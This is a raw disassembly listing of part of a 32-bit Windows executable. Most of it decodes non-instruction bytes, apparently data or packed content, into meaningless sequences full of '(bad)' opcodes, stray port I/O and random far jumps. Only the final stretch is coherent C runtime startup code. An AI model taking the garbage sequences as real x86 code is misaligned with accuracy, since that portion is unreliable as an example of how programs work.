  423d24:	sete   BYTE PTR [edi]
  423d27:	(bad)  
  423d28:	into   
  423d29:	ins    BYTE PTR es:[edi],dx
  423d2a:	lahf   
  423d2b:	and    BYTE PTR [edi],0x60
  423d2e:	sbb    esi,DWORD PTR [ebx]
  423d30:	fwait
  423d31:	cld    
  423d32:	mov    ebp,0x933ef882
  423d37:	out    dx,eax
  423d38:	lea    esp,[esi-0x25]
  423d3b:	aad    0x4
  423d3d:	mov    dh,ah
  423d3f:	out    dx,al
  423d40:	pop    ds
  423d41:	lds    eax,FWORD PTR cs:[edi+0x1eca6b7e]
  423d48:	test   al,0xb7
  423d4a:	into   
  423d4b:	push   eax
  423d4c:	jg     0x423d96
  423d4e:	mov    al,ds:0xac10951c
  423d53:	(bad)  
  423d57:	jnp    0x423d25
  423d59:	mov    ds:0x7cb6a296,al
  423d5e:	jno    0x423dc1
  423d60:	cld    
  423d61:	std    
  423d62:	retf   0x2efb
  423d65:	mov    bh,0x82
  423d67:	inc    eax
  423d68:	pop    ebx
  423d69:	(bad)  
  423d6a:	jecxz  0x423d3e
  423d6c:	mov    edx,0x29d6ed72
  423d71:	and    ebx,DWORD PTR ds:0x37ff1c00
  423d77:	aas    
  423d78:	mov    dl,0x32
  423d7a:	sar    al,cl
  423d7c:	add    bl,BYTE PTR [ebp-0xe5dca3a]
  423d82:	out    dx,eax
  423d83:	call   0x548a6936
  423d88:	xor    BYTE PTR [esi+0x39d7cc5d],ch
  423d8e:	inc    ebx
  423d8f:	mov    ds:0x906994d4,eax
  423d94:	inc    ebx
  423d95:	xor    DWORD PTR [eax-0x7c44748a],esp
  423d9b:	pop    edx
  423d9c:	sti    
  423d9d:	xlat   BYTE PTR ds:[ebx]
  423d9e:	or     cl,dh
  423da0:	(bad)  
  423da1:	jnp    0x423d34
  423da3:	push   ss
  423da4:	into   
  423da5:	out    dx,al
  423da6:	stc    
  423da7:	push   eax
  423da8:	shl    BYTE PTR [eax],1
  423daa:	sub    ebp,DWORD PTR [esp]
  423dad:	mov    cl,BYTE PTR [edi-0x4]
  423db0:	fsubr  QWORD PTR [ebp+0x14]
  423db3:	cli    
  423db4:	push   ds
  423db5:	je     0x423d5f
  423db7:	xor    al,0xc6
  423db9:	mov    ebp,0x962faecf
  423dbe:	mov    ebp,0xdcf11b3d
  423dc3:	mov    ah,0x93
  423dc5:	mov    cl,0x6d
  423dc7:	fpatan 
  423dc9:	fdivr  DWORD PTR [edi+0x3f]
  423dcc:	outs   dx,BYTE PTR ds:[esi]
  423dcd:	jg     0x423e03
  423dcf:	jmp    0x423dff
  423dd1:	xor    eax,0x6648e4a6
  423dd6:	pop    ebx
  423dd7:	dec    eax
  423dd8:	sbb    al,dh
  423dda:	js     0x423d7d
  423ddc:	aaa    
  423ddd:	jecxz  0x423e39
  423ddf:	lds    ebp,FWORD PTR [edx]
  423de1:	cdq    
  423de2:	jmp    FWORD PTR [edi-0x35]
  423de5:	xor    eax,0xa4131fbb
  423dea:	cs jb  0x423d82
  423ded:	adc    al,BYTE PTR [edi]
  423def:	inc    BYTE PTR [eax]
  423df1:	sbb    ebx,ecx
  423df3:	jmp    FWORD PTR [eax]
  423df5:	xor    bh,BYTE PTR [esi+ebx*8]
  423df8:	xchg   DWORD PTR ds:0xff6e3ae5,esp
  423dfe:	jb     0x423da4
  423e00:	rol    DWORD PTR [esi+0x74],1
  423e03:	mov    esi,0x79a88116
  423e08:	dec    esp
  423e09:	idiv   BYTE PTR [edx]
  423e0b:	mov    al,ds:0xb03fe663
  423e10:	pop    ebp
  423e11:	add    DWORD PTR [esp+ecx*4+0x6e5512ea],0x67
  423e19:	loopne 0x423e7d
  423e1b:	xor    DWORD PTR [esi],edx
  423e1d:	fst    QWORD PTR [ecx-0x79bb49d]
  423e23:	faddp  st(0),st
  423e25:	mov    edi,ecx
  423e27:	and    dh,BYTE PTR [esi]
  423e29:	jmp    0x343c:0xe662d4c
  423e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e31:	jne    0x423e2b
  423e33:	cmp    al,0x6
  423e35:	vmaxpd ymm0,ymm6,YMMWORD PTR [edx-0x4b49f961]
  423e3d:	mov    cl,0x12
  423e3f:	inc    esp
  423e40:	or     eax,0xe6970670
  423e45:	cmp    al,0x51
  423e47:	pusha  
  423e48:	xor    al,0x1
  423e4a:	sbb    eax,DWORD PTR gs:[esi-0x40]
  423e4e:	mov    ds:0xba598070,eax
  423e53:	(bad)  
  423e54:	push   ebp
  423e55:	call   0x19c6:0x6d614fc4
  423e5c:	inc    edi
  423e5d:	outs   dx,DWORD PTR ds:[esi]
  423e5e:	adc    bh,dl
  423e60:	push   ss
  423e61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e62:	cmp    bh,BYTE PTR [ecx-0xe17ab59]
  423e68:	xor    eax,0xd38c6cd2
  423e6d:	jne    0x423ec3
  423e6f:	cmp    BYTE PTR [ecx+0x1],ah
  423e72:	pop    ds
  423e73:	aaa    
  423e74:	sbb    ebp,DWORD PTR [ecx]
  423e76:	jne    0x423e82
  423e78:	(bad)  
  423e79:	addr16 out dx,eax
  423e7b:	sub    eax,0xea02d8c9
  423e80:	jae    0x423eb4
  423e82:	inc    eax
  423e83:	adc    al,0xc9
  423e85:	mov    esp,0x7411ce83
  423e8a:	in     al,0xee
  423e8c:	leave  
  423e8d:	call   0x841:0x677b64ed
  423e94:	into   
  423e95:	ins    DWORD PTR es:[edi],dx
  423e96:	pop    ecx
  423e97:	xlat   BYTE PTR cs:[ebx]
  423e99:	cs (bad) 
  423e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e9c:	sbb    DWORD PTR cs:[edi-0x1d],esp
  423ea0:	adc    cl,bh
  423ea2:	hlt    
  423ea3:	es sbb esp,esp
  423ea6:	add    ebx,DWORD PTR [edx-0x55d17cda]
  423eac:	cld    
  423ead:	mov    eax,0x96ead6e0
  423eb2:	xchg   ecx,eax
  423eb3:	gs icebp 
  423eb5:	and    ah,bl
  423eb7:	jnp    0x423e63
  423eb9:	sub    DWORD PTR [edx+eax*2],0xffffffa4
  423ebd:	(bad)  
  423ebe:	clc    
  423ebf:	(bad)  
  423ec0:	enter  0x29f4,0xdd
  423ec4:	aas    
  423ec5:	push   sp
  423ec7:	shl    DWORD PTR [ebx],0x30
  423eca:	mov    ch,0xac
  423ecc:	call   0x9adc:0x615d69c1
  423ed3:	(bad)  
  423ed4:	push   ebx
  423ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ed6:	xor    dh,BYTE PTR [ebx+0x4a5e8e83]
  423edc:	mov    BYTE PTR [edx-0x6d47d63e],dl
  423ee2:	mov    dl,0xe7
  423ee4:	and    eax,0x3aa2dcb8
  423ee9:	ret    
  423eea:	shl    ebx,1
  423eec:	test   eax,0xb6e231ab
  423ef1:	addr16 ja 0x423f3c
  423ef4:	or     bh,dl
  423ef6:	cmp    al,0xdb
  423ef8:	lock pop eax
  423efa:	std    
  423efb:	adc    dh,BYTE PTR [edi]
  423efd:	lds    ebx,FWORD PTR [esi+0x1f]
  423f00:	push   ebx
  423f01:	mov    bh,0x4
  423f03:	push   eax
  423f04:	cmc    
  423f05:	hlt    
  423f06:	adc    al,0xbf
  423f08:	mov    ah,0xbe
  423f0a:	enter  0x893,0x13
  423f0e:	add    bl,ah
  423f10:	sti    
  423f11:	shr    DWORD PTR [ecx-0x7c],1
  423f14:	add    al,0x53
  423f16:	add    ch,BYTE PTR [esi]
  423f18:	xor    BYTE PTR [eax+0xe333137],0x66
  423f1f:	popf   
  423f20:	lahf   
  423f21:	pop    esp
  423f22:	sar    DWORD PTR [esi+0x69],0xdf
  423f26:	add    BYTE PTR [edx-0x61df5a09],ch
  423f2c:	jne    0x423ed8
  423f2e:	cmp    eax,0x7826208d
  423f33:	in     eax,dx
  423f34:	sbb    edi,DWORD PTR [edi+0x50]
  423f37:	retf   0x206c
  423f3a:	out    0x7b,al
  423f3c:	adc    al,0xa6
  423f3e:	jno    0x423efb
  423f40:	push   ebx
  423f41:	ss popf 
  423f43:	inc    edx
  423f44:	loopne 0x423f91
  423f46:	(bad)  [esi]
  423f48:	xchg   edx,eax
  423f49:	(bad)  
  423f4a:	fisub  DWORD PTR [edi-0x21d1384a]
  423f50:	jecxz  0x423f48
  423f52:	mov    WORD PTR [edx-0x43],fs
  423f55:	sbb    BYTE PTR [ecx],0x8d
  423f58:	icebp  
  423f59:	clc    
  423f5a:	jecxz  0x423f75
  423f5c:	jb     0xafe2b685
  423f62:	cmp    ch,dh
  423f64:	pop    esp
  423f65:	ret    0x521d
  423f68:	arpl   WORD PTR [ebx],ax
  423f6a:	hlt    
  423f6b:	addr16 mov edx,0x11d08546
  423f71:	fistp  DWORD PTR [ecx+0x53178447]
  423f77:	mov    eax,ds:0x11f9541b
  423f7c:	adc    al,0x3d
  423f7e:	stos   DWORD PTR es:[edi],eax
  423f7f:	ins    BYTE PTR es:[edi],dx
  423f80:	pop    ss
  423f81:	leave  
  423f82:	arpl   WORD PTR es:[ebp+esi*8+0x6fc4cf5e],cx
  423f8a:	pop    esp
  423f8b:	mov    esi,0x72ef2fcd
  423f90:	adc    ecx,DWORD PTR [esi+eax*8-0x7f7ad3ae]
  423f97:	sub    ebx,DWORD PTR [edx]
  423f99:	aas    
  423f9a:	and    ebp,ebp
  423f9c:	test   eax,0x67b85821
  423fa1:	or     al,0x21
  423fa3:	xor    ch,BYTE PTR [esp+esi*2]
  423fa6:	cmp    al,BYTE PTR [edi+0x3da16db8]
  423fac:	bound  edx,QWORD PTR [edi]
  423fae:	scas   al,BYTE PTR es:[edi]
  423faf:	pushf  
  423fb0:	sbb    bh,BYTE PTR [ecx-0x61]
  423fb3:	test   DWORD PTR [eax],eax
  423fb5:	push   0xb7ec3fde
  423fba:	mov    ebp,0x4b0d1a73
  423fbf:	cmp    DWORD PTR [esi],edi
  423fc1:	mov    edx,0x62dbafae
  423fc6:	ins    DWORD PTR es:[edi],dx
  423fc7:	pushf  
  423fc8:	and    ebp,DWORD PTR [esi+ebx*2]
  423fcb:	push   ebx
  423fcc:	ss inc cx
  423fcf:	arpl   WORD PTR [eax+ebx*8],dx
  423fd2:	or     BYTE PTR [eax+0x5c],ch
  423fd5:	(bad)  
  423fd6:	pop    ecx
  423fd7:	mov    ebp,esp
  423fd9:	cmp    BYTE PTR ds:0xc7f6ee52,cl
  423fdf:	lahf   
  423fe0:	ror    DWORD PTR [ecx-0x68cc0c61],cl
  423fe6:	mov    bl,0x9b
  423fe8:	mov    al,0xab
  423fea:	push   0xffffff91
  423fec:	ss mov DWORD PTR es:[eax],edi
  423ff0:	sub    bl,bh
  423ff2:	jnp    0x424036
  423ff4:	adc    DWORD PTR [eax-0x79],0x99f7c91f
  423ffb:	dec    ebx
  423ffc:	xchg   esp,eax
  423ffd:	jo     0x424059
  423fff:	inc    ebx
  424000:	popa   
  424001:	inc    edx
  424002:	out    dx,al
  424003:	in     al,dx
  424004:	jp     0x423f8e
  424006:	mov    BYTE PTR [ebp-0x2691e3f],al
  42400c:	test   dl,ah
  42400e:	rcr    DWORD PTR [eax-0x2b],0x92
  424012:	pop    esp
  424013:	je     0x424057
  424015:	push   ds
  424016:	pop    ds
  424017:	sbb    edx,esp
  424019:	jnp    0x424043
  42401b:	push   ebx
  42401c:	std    
  42401d:	add    eax,eax
  42401f:	pop    edx
  424020:	push   es
  424021:	mov    edx,?
  424023:	sbb    al,0x1a
  424025:	mov    dl,0xea
  424027:	cmp    al,bh
  424029:	jg     0x424031
  42402b:	es fwait
  42402d:	out    dx,eax
  42402e:	call   0xf38fdec4
  424033:	mov    edx,0x7670a677
  424038:	sahf   
  424039:	xor    eax,0x5fbe32ae
  42403e:	xor    al,0xf9
  424040:	add    esi,ebx
  424042:	xor    eax,0xecee98f5
  424047:	mov    ds:0x616700bb,al
  42404c:	push   esp
  42404d:	adc    DWORD PTR [edx+0x3a40c13e],esi
  424053:	sbb    DWORD PTR gs:[ebx+0x5f8bb2f7],ebx
  42405a:	cdq    
  42405b:	or     ebx,ebp
  42405d:	scas   al,BYTE PTR es:[edi]
  42405e:	pop    edi
  42405f:	push   edi
  424060:	jbe    0x424075
  424062:	or     cl,BYTE PTR [ecx+0x3b]
  424065:	pusha  
  424066:	pushf  
  424067:	mov    ds,WORD PTR [ebp-0xa3247da]
  42406d:	xor    eax,0xc4180087
  424072:	in     eax,0xfc
  424074:	sbb    eax,0x9df6696
  424079:	adc    BYTE PTR [edi+ebx*1-0x55],cl
  42407d:	adc    ch,al
  42407f:	pop    edi
  424080:	push   esi
  424081:	sahf   
  424082:	add    al,0xb3
  424084:	adc    DWORD PTR [edi+0x7d],0x2d064359
  42408b:	xor    DWORD PTR [ebp+0x6624fe0b],0xffffffac
  424092:	sub    bh,ch
  424094:	add    al,0xb5
  424096:	jmp    0x5fe5:0xa9b42
  42409d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42409e:	and    eax,0xa7abb482
  4240a3:	mov    bl,0xe5
  4240a5:	mov    ds:0xe39f265a,eax
  4240aa:	sar    DWORD PTR [eax-0x53],0x2f
  4240ae:	mov    ebp,0xd0f346ae
  4240b3:	pop    ecx
  4240b4:	in     al,dx
  4240b5:	pop    ebp
  4240b6:	sbb    bh,BYTE PTR [ecx+ebx*1+0x42697156]
  4240bd:	xchg   ecx,eax
  4240be:	push   es
  4240bf:	dec    edx
  4240c0:	mov    ds:0x5311c34f,al
  4240c5:	test   eax,0x6db61f72
  4240ca:	jo     0x4240ab
  4240cc:	jne    0x424122
  4240ce:	sbb    eax,eax
  4240d0:	sbb    BYTE PTR [ebp+0x48fcae38],cl
  4240d6:	jo     0x424153
  4240d8:	ja     0x4240fd
  4240da:	adc    DWORD PTR [esi],esi
  4240dc:	sbb    al,0xd5
  4240de:	fidivr WORD PTR [esi-0x1f]
  4240e1:	in     al,0xc4
  4240e3:	mov    cl,ch
  4240e5:	cmp    BYTE PTR [edi],bh
  4240e7:	pop    esi
  4240e8:	mov    WORD PTR [esi],?
  4240ea:	pop    esi
  4240eb:	rcr    DWORD PTR [eax+0x51],0xd7
  4240ef:	in     al,0xa2
  4240f1:	and    esp,ecx
  4240f3:	outs   dx,DWORD PTR ds:[esi]
  4240f4:	mov    ah,0x9c
  4240f6:	ficomp DWORD PTR [edx+0x4f3fae7a]
  4240fc:	jl     0x4240be
  4240fe:	enter  0x8075,0xb2
  424102:	mov    edx,0xc97359f8
  424107:	adc    ecx,DWORD PTR [esi+ecx*2-0x2e8eed72]
  42410e:	in     eax,0x52
  424110:	or     ecx,esp
  424112:	neg    ebp
  424114:	and    al,0x5a
  424116:	add    cl,BYTE PTR [ebx]
  424118:	pop    esi
  424119:	sti    
  42411a:	add    esi,DWORD PTR [edi]
  42411c:	in     al,0x1
  42411e:	test   eax,0xfca152e6
  424123:	inc    ecx
  424124:	cmp    eax,0x929cb8a
  424129:	and    BYTE PTR [ebp-0x274711f9],dl
  42412f:	ins    BYTE PTR es:[edi],dx
  424130:	dec    ebp
  424131:	into   
  424132:	xor    cl,dl
  424134:	sbb    DWORD PTR [ecx],0xb23c0ea0
  42413a:	inc    esp
  42413b:	jmp    0x5ff2b1b8
  424140:	jl     0x424183
  424142:	add    DWORD PTR [ecx-0xf1e84e3],ecx
  424148:	in     al,0x2e
  42414a:	ret    
  42414b:	inc    edi
  42414c:	jb     0x4240cf
  42414e:	lds    edx,FWORD PTR [edx+0x13]
  424151:	cmc    
  424152:	cmp    BYTE PTR [esi+esi*1+0x2b],0xb3
  424157:	test   DWORD PTR [edi-0x39],edi
  42415a:	add    esi,DWORD PTR [esi]
  42415c:	retf   0x7bee
  42415f:	clc    
  424160:	sbb    BYTE PTR [edi],ah
  424162:	out    dx,eax
  424163:	test   al,0x26
  424165:	es jo  0x424120
  424168:	mov    dh,0x96
  42416a:	adc    al,BYTE PTR [ecx-0x1d2a212d]
  424170:	in     al,dx
  424171:	dec    ebx
  424172:	pop    esi
  424173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424174:	mov    ah,0xd
  424176:	dec    eax
  424177:	push   es
  424178:	stc    
  424179:	push   edx
  42417a:	mov    DWORD PTR [eax+edx*8+0x60af71d7],edi
  424181:	nop
  424182:	repz push eax
  424184:	pop    eax
  424185:	cmp    eax,0xf2a66f2
  42418a:	loopne 0x42413b
  42418c:	push   edi
  42418d:	ja     0x424139
  42418f:	ds stos DWORD PTR es:[edi],eax
  424191:	xor    eax,0xb9f0d9bc
  424196:	inc    ebx
  424197:	sahf   
  424198:	(bad)  
  424199:	ins    DWORD PTR es:[edi],dx
  42419a:	js     0x42417c
  42419c:	(bad)  
  42419d:	cmp    eax,0x5ff9f08c
  4241a2:	scas   al,BYTE PTR es:[edi]
  4241a3:	dec    edx
  4241a4:	mov    ecx,0xa0c3c130
  4241a9:	loope  0x424190
  4241ab:	push   ebp
  4241ac:	(bad)  
  4241ad:	mov    ds:0xbae98cf8,al
  4241b2:	iret   
  4241b3:	xor    edi,esi
  4241b5:	jg     0x424216
  4241b7:	and    eax,0x49bab9c2
  4241bc:	pop    edx
  4241bd:	ret    
  4241be:	inc    edi
  4241bf:	in     eax,dx
  4241c0:	push   DWORD PTR cs:[edx-0x8]
  4241c4:	push   0xffffff8d
  4241c6:	sti    
  4241c7:	out    dx,eax
  4241c8:	outs   dx,BYTE PTR ds:[esi]
  4241c9:	mov    al,ds:0x2a800b9f
  4241ce:	mov    ebx,0xc7d8ce24
  4241d3:	(bad)  
  4241d4:	pusha  
  4241d5:	add    BYTE PTR [eax+ecx*4-0x75],dl
  4241d9:	sbb    al,0x83
  4241db:	adc    al,0x0
  4241dd:	mov    bl,BYTE PTR [edi]
  4241df:	dec    edi
  4241e0:	lahf   
  4241e1:	rol    BYTE PTR [ebx-0x15],1
  4241e4:	clc    
  4241e5:	xchg   edi,eax
  4241e6:	inc    ebx
  4241e7:	aas    
  4241e8:	xchg   ebp,eax
  4241e9:	xchg   ebp,eax
  4241ea:	push   ds
  4241eb:	jno    0x42417d
  4241ed:	das    
  4241ee:	jno    0x4241a3
  4241f0:	bound  edi,QWORD PTR [ecx+0x5c]
  4241f3:	retf   
  4241f4:	ficom  WORD PTR [edx]
  4241f6:	mov    ds:0x27652e75,eax
  4241fb:	xchg   esi,eax
  4241fc:	lds    esp,FWORD PTR [ecx+eiz*1]
  4241ff:	mov    DWORD PTR [esi],esi
  424201:	adc    ah,BYTE PTR ds:0xbdc63563
  424207:	mov    al,0xe3
  424209:	in     al,dx
  42420a:	jmp    FWORD PTR [edx]
  42420c:	clc    
  42420d:	inc    esp
  42420e:	mov    bh,0xf6
  424210:	sbb    BYTE PTR [ecx+0xd],dl
  424213:	adc    al,0x9f
  424216:	dec    edi
  424217:	ss call 0x339abafd
  42421d:	xchg   edx,eax
  42421e:	push   edi
  42421f:	push   esp
  424220:	mov    ebx,0xe1c336b5
  424225:	mov    ebp,0x2e37dbcc
  42422a:	xor    al,BYTE PTR [ebp-0x11]
  42422d:	in     al,dx
  42422e:	jp     0x4241d0
  424230:	ins    BYTE PTR es:[edi],dx
  424231:	mov    dl,cl
  424233:	cdq    
  424234:	popf   
  424235:	and    al,0x30
  424237:	inc    edx
  424238:	(bad)  
  424239:	and    edi,DWORD PTR [eax]
  42423b:	aad    0xb5
  42423d:	mov    ebp,0x3187368b
  424242:	cmp    BYTE PTR [edi],cl
  424244:	xor    DWORD PTR [edx-0x2e],0x35
  424248:	mov    ebx,0xf504f945
  42424d:	adc    eax,0xc14fe946
  424252:	aam    0xc1
  424254:	cdq    
  424255:	pop    ebx
  424256:	jp     0x4241e3
  424258:	pop    edi
  424259:	daa    
  42425a:	in     al,dx
  42425b:	xchg   ebp,eax
  42425c:	cs push es
  42425e:	mov    cl,0xbc
  424260:	lods   eax,DWORD PTR ds:[esi]
  424261:	sti    
  424262:	fwait
  424263:	lahf   
  424264:	(bad)  
  424265:	and    DWORD PTR [eax-0x604bd749],esi
  42426b:	jecxz  0x424239
  42426d:	(bad)  
  42426f:	jne    0x42424a
  424271:	push   0x9
  424273:	mov    cl,ah
  424275:	adc    esi,DWORD PTR [edx]
  424277:	pop    ebx
  424278:	fadd   DWORD PTR [ebx-0x77]
  42427b:	in     eax,dx
  42427c:	cmp    esi,DWORD PTR [esi-0x679f3644]
  424282:	retf   
  424283:	add    DWORD PTR [ebp+0x2c],edi
  424286:	fs inc esi
  424288:	mov    ecx,0x279df9c
  42428d:	mov    dl,0xcd
  42428f:	ins    DWORD PTR es:[edi],dx
  424290:	adc    DWORD PTR ds:0xb0f726f9,esi
  424296:	dec    ebx
  424297:	dec    ebx
  424298:	adc    al,0x6b
  42429a:	fidiv  WORD PTR [edx+0x515216aa]
  4242a0:	xor    dl,0x67
  4242a3:	jle    0x42423b
  4242a5:	popf   
  4242a6:	outs   dx,DWORD PTR ds:[esi]
  4242a7:	adc    BYTE PTR [esi-0x2d70a202],0xa9
  4242ae:	mov    al,ds:0xa136bd62
  4242b3:	dec    eax
  4242b4:	sbb    eax,0xfae1342
  4242b9:	pop    es
  4242ba:	stc    
  4242bb:	fdiv   QWORD PTR [edx+0x51785a55]
  4242c1:	mov    ch,0x66
  4242c3:	mov    bh,0xfe
  4242c5:	mov    ch,0x62
  4242c7:	ins    DWORD PTR es:[edi],dx
  4242c8:	je     0x42428a
  4242ca:	inc    ebx
  4242cb:	or     eax,0xcbe9a261
  4242d0:	test   BYTE PTR [esi+ecx*4],bl
  4242d3:	push   ss
  4242d4:	mov    ecx,0x27af2425
  4242d9:	out    dx,eax
  4242da:	dec    ecx
  4242db:	inc    esp
  4242dc:	sub    BYTE PTR [ebx-0xd3061b4],dl
  4242e2:	sbb    al,0xe4
  4242e4:	push   edi
  4242e5:	jl     0x424364
  4242e7:	sub    eax,0xb3766236
  4242ec:	int    0x7d
  4242ee:	push   ebp
  4242ef:	fucomp st(2)
  4242f1:	and    ch,BYTE PTR [ebx]
  4242f3:	inc    ebp
  4242f4:	fstp   TBYTE PTR [edi]
  4242f6:	sub    DWORD PTR [ebx],edi
  4242f8:	mov    es,WORD PTR [edi]
  4242fa:	inc    ebp
  4242fb:	push   cs
  4242fc:	fldenv [ebp-0x17dbc92e]
  424302:	xor    al,0xbe
  424304:	mul    BYTE PTR [eax+0x34]
  424307:	push   esi
  424308:	and    al,0x88
  42430a:	adc    edi,DWORD PTR [edi]
  42430c:	mov    dl,0x90
  42430e:	in     al,0x78
  424310:	or     BYTE PTR [ecx+eax*2+0x37],dl
  424314:	scas   al,BYTE PTR es:[edi]
  424315:	dec    ecx
  424316:	ja     0x4242c5
  424318:	je     0x424324
  42431a:	clc    
  42431b:	inc    ebp
  42431c:	pop    ds
  42431d:	mov    ds:0xcf40085a,eax
  424322:	shl    BYTE PTR [ecx],0x7d
  424325:	in     al,dx
  424326:	xchg   edx,eax
  424327:	mov    dh,0x6
  424329:	xor    BYTE PTR [ebp+0x77],dh
  42432c:	out    0xb4,al
  42432e:	inc    ebp
  42432f:	jecxz  0x42431b
  424331:	sbb    eax,0xa2e77af
  424336:	fbstp  TBYTE PTR [edx+0x3d]
  424339:	lock lahf 
  42433b:	mov    cl,0xe3
  42433d:	int    0x82
  42433f:	add    bh,dh
  424341:	inc    esi
  424342:	cli    
  424343:	(bad)  
  424344:	dec    DWORD PTR [ebp-0x5d1bd22f]
  42434a:	loop   0x4243cb
  42434c:	sub    al,0x2d
  42434e:	ret    
  42434f:	lahf   
  424350:	inc    ebp
  424351:	mov    esi,0x47532df7
  424356:	sub    edx,DWORD PTR [edi-0x259915c3]
  42435c:	inc    edx
  42435d:	lea    edx,[eax+0x2f]
  424360:	mov    ch,0x81
  424362:	clc    
  424363:	out    0xa0,eax
  424365:	mov    ecx,0x6f102d50
  42436a:	data16 lock cmc 
  42436d:	push   edi
  42436e:	cmp    eax,0x813acedf
  424373:	sbb    al,0xa5
  424375:	xchg   ebp,eax
  424376:	lods   eax,DWORD PTR ds:[esi]
  424377:	fist   DWORD PTR [edx]
  424379:	cdq    
  42437a:	ds push 0xd5a4ca5
  424380:	sbb    al,0xb8
  424382:	dec    ebp
  424383:	sbb    DWORD PTR [ebx-0x491dd218],edi
  424389:	mov    BYTE PTR [ebp-0x2a79e738],dh
  42438f:	loop   0x424372
  424391:	dec    ebx
  424392:	pop    ss
  424393:	retf   0xb784
  424396:	out    0xf9,eax
  424398:	mov    dl,0x5d
  42439a:	adc    eax,0x7121e397
  42439f:	bound  ebp,QWORD PTR [ebp+0xb0f273b]
  4243a5:	out    dx,eax
  4243a6:	sub    cl,dh
  4243a8:	mov    al,ds:0x384b6ce6
  4243ad:	shl    DWORD PTR [edi],0x5d
  4243b0:	jbe    0x4243d3
  4243b2:	retf   
  4243b3:	in     al,0x1f
  4243b5:	mov    ebp,edx
  4243b7:	dec    esi
  4243b8:	in     al,dx
  4243b9:	xchg   esp,eax
  4243ba:	pop    esi
  4243bb:	mov    BYTE PTR [eax],bh
  4243bd:	out    dx,eax
  4243be:	jae    0x4243d8
  4243c0:	es inc esp
  4243c2:	push   esp
  4243c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4243c5:	push   eax
  4243c6:	adc    BYTE PTR [edx],ah
  4243c8:	cwde   
  4243c9:	push   ebx
  4243ca:	addr16 mov eax,0xa090490f
  4243d0:	xchg   DWORD PTR es:[edx+0x5e],ebp
  4243d4:	sti    
  4243d5:	inc    edi
  4243d6:	sub    DWORD PTR [ebx],ecx
  4243d8:	pop    ebp
  4243d9:	and    eax,edi
  4243db:	int    0xb6
  4243dd:	mov    ds:0x2020da6e,eax
  4243e2:	jmp    0xd312:0xbb944848
  4243e9:	rcr    DWORD PTR [eax+0x3f],0x1
  4243ed:	aad    0x6a
  4243ef:	add    BYTE PTR [edx+0x0],ch
  4243f2:	call   0x424400
  4243f7:	xor    eax,eax
  4243f9:	add    esp,0x10
  4243fc:	ret    0x10
  4243ff:	nop
  424400:	jmp    DWORD PTR ds:0x429110
  424406:	cmp    DWORD PTR ds:0x45dabc,0x1
  42440d:	jne    0x424414
  42440f:	call   0x424952
  424414:	push   DWORD PTR [esp+0x4]
  424418:	call   0x4247db
  42441d:	push   0xff
  424422:	call   DWORD PTR ds:0x45d1c0
  424428:	pop    ecx
  424429:	pop    ecx
  42442a:	ret    
  42442b:	cmp    DWORD PTR ds:0x45dabc,0x1
  424432:	jne    0x424439
  424434:	call   0x424952
  424439:	push   DWORD PTR [esp+0x4]
  42443d:	call   0x4247db
  424442:	push   0xff
  424447:	call   0x424621
  42444c:	pop    ecx
  42444d:	pop    ecx
  42444e:	ret    
  42444f:	push   0x60
  424451:	push   0x429220
  424456:	call   0x425340
  42445b:	mov    edi,0x94
  424460:	mov    eax,edi
  424462:	call   0x425390
  424467:	mov    DWORD PTR [ebp-0x18],esp
  42446a:	mov    esi,esp
  42446c:	mov    DWORD PTR [esi],edi
  42446e:	push   esi
  42446f:	call   DWORD PTR ds:0x429054
  424475:	mov    ecx,DWORD PTR [esi+0x10]
  424478:	mov    DWORD PTR ds:0x45dac4,ecx
  42447e:	mov    eax,DWORD PTR [esi+0x4]
  424481:	mov    ds:0x45dad0,eax
  424486:	mov    edx,DWORD PTR [esi+0x8]
  424489:	mov    DWORD PTR ds:0x45dad4,edx
  42448f:	mov    esi,DWORD PTR [esi+0xc]
  424492:	and    esi,0x7fff
  424498:	mov    DWORD PTR ds:0x45dac8,esi
  42449e:	cmp    ecx,0x2
  4244a1:	je     0x4244af
  4244a3:	or     esi,0x8000
  4244a9:	mov    DWORD PTR ds:0x45dac8,esi
  4244af:	shl    eax,0x8
  4244b2:	add    eax,edx
  4244b4:	mov    ds:0x45dacc,eax
  4244b9:	xor    esi,esi
  4244bb:	push   esi
  4244bc:	mov    edi,DWORD PTR ds:0x429024
  4244c2:	call   edi
  4244c4:	cmp    WORD PTR [eax],0x5a4d
  4244c9:	jne    0x4244ea
  4244cb:	mov    ecx,DWORD PTR [eax+0x3c]
  4244ce:	add    ecx,eax
  4244d0:	cmp    DWORD PTR [ecx],0x4550
  4244d6:	jne    0x4244ea
  4244d8:	movzx  eax,WORD PTR [ecx+0x18]
  4244dc:	cmp    eax,0x10b
  4244e1:	je     0x424502
  4244e3:	cmp    eax,0x20b
  4244e8:	je     0x4244ef
  4244ea:	mov    DWORD PTR [ebp-0x1c],esi
  4244ed:	jmp    0x424516
  4244ef:	cmp    DWORD PTR [ecx+0x84],0xe
  4244f6:	jbe    0x4244ea
  4244f8:	xor    eax,eax
  4244fa:	cmp    DWORD PTR [ecx+0xf8],esi
  424500:	jmp    0x424510
  424502:	cmp    DWORD PTR [ecx+0x74],0xe
  424506:	jbe    0x4244ea
  424508:	xor    eax,eax
  42450a:	cmp    DWORD PTR [ecx+0xe8],esi
  424510:	setne  al
  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
